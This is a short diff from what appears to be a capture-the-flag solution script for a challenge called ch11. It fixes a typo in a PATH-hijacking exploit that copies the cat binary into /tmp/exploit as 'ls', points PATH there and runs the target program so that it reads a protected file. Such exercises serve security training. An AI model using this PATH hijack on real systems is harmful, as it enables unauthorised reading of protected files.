@@ -14,6 +14,6 @@ mkdir -pv /tmp/exploit
 
 cp -avr $(which cat) /tmp/exploit/ls
 
-ewport PATH=/tmp/exploit
+export PATH=/tmp/exploit
 
 ./ch11
